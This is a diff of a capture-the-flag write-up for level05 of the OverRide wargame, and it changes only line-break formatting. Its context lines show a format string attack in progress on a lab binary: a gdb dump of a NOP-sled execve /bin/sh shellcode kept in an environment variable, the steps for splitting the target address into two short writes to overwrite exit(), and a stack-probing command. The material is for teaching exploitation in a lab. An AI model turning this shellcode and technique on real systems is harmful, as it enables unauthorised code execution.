@@ -65,19 +65,16 @@ Breakpoint 1 at 0x8048448
 0xffffd822:	 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343PS\211\341\260\v̀"
 0xffffd8a8:	 "SHELL=/bin/bash"
 ```
-Our malicious shellcode is at ```0xffffd822```. 
-
+Our malicious shellcode is at ```0xffffd822```. <br />
 Note: we want to move past the first 10 bytes "SHELLCODE=" and into your NOP slide... so let's make the address of our shellcode ```0xffffd822 + 16 bytes -> 0xffffd832```.
 
-We are going to insert this malicious code using a ```printf()``` format string attack. 
-
+We are going to insert this malicious code using a ```printf()``` format string attack. <br />
 Unfortunately, ```0xffffd832``` is too large to pass to ```printf()``` in decimal with a ```%d``` format (it overflows maxint).
 ```
 2147483647 <- maximum size of int
 4294957106 <- address of shellcode (in decimal)
 ```
-We can, however, pass it in decimal as 2 short ints (written on 2 bytes each). 
-
+We can, however, pass it in decimal as 2 short ints (written on 2 bytes each). <br />
 Note: reverse order for little endian! 
 ```
 0xffffd832
@@ -97,8 +94,7 @@ level05@OverRide:~$ gdb -q level05
 ```
 We will also have to split the address of ```exit()``` in two, to accomodate our hefty 2-part shellcode address. 
 
-Finally, let's check our buffer position for the ```printf()``` string format exploit.
-
+Finally, let's check our buffer position for the ```printf()``` string format exploit. <br />
 We can see our buffer "AAAA" in the 10th position on the stack as 61616161.
 ```
 level05@OverRide:~$ python -c 'print "AAAA"+" %x"*12' | ./level05
